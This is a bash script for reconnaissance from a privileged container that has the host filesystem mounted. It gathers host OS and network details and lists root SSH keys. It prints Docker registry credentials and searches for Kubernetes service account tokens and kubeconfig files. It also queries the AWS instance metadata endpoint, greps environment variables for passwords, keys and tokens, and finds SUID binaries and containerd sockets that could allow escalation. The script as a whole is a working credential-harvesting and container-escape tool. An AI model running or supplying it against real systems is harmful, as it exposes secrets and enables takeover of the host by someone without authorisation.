#!/bin/bash
# Host System Enumeration Script
# Run from within privileged container with host mount

echo "=== Host System Enumeration ==="
echo ""

echo "[*] Host system information..."
chroot /host uname -a 2>/dev/null || echo "  Cannot chroot"
cat /host/etc/os-release 2>/dev/null | head -5
echo ""

echo "[*] Network interfaces..."
cat /host/proc/net/route 2>/dev/null | head -10
echo ""

echo "[*] ARP table..."
cat /host/proc/net/arp 2>/dev/null
echo ""

echo "[*] Listening services (from /proc/net/tcp)..."
cat /host/proc/net/tcp 2>/dev/null | awk '{print $2, $10}' | head -20
echo ""

echo "[*] Checking for SSH keys..."
echo "Root SSH keys:"
ls -la /host/root/.ssh/ 2>/dev/null | head -10 || echo "  No root .ssh directory"
echo ""

echo "[*] Checking for Docker credentials..."
cat /host/root/.docker/config.json 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "  No Docker config found"
find /host/home -name ".docker" -type d 2>/dev/null | head -5
echo ""

echo "[*] Checking for Kubernetes credentials..."
find /host -path "*/serviceaccount/token" 2>/dev/null | head -10
find /host -path "*/.kube/config" 2>/dev/null | head -10
echo ""

echo "[*] Checking for cloud provider metadata..."
echo "AWS (169.254.169.254):"
curl -s --max-time 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null | head -5 || echo "  Not AWS"
echo ""

echo "[*] Checking for writable directories..."
find /host/tmp -writable -type d 2>/dev/null | head -5
find /host/var/tmp -writable -type d 2>/dev/null | head -5
echo ""

echo "[*] Checking for SUID binaries..."
find /host -perm -4000 -type f 2>/dev/null | head -20
echo ""

echo "[*] Checking environment for secrets..."
env | grep -iE "(pass|secret|key|token|cred|api)" | head -10
echo ""

echo "[*] Checking mounted filesystems..."
cat /host/proc/mounts | grep -v "^#" | head -20
echo ""

echo "[*] Checking for other container runtimes..."
ls -la /host/run/containerd/containerd.sock 2>/dev/null && echo "  containerd socket found"
ls -la /host/var/run/containerd/containerd.sock 2>/dev/null && echo "  containerd socket found (alt location)"
echo ""
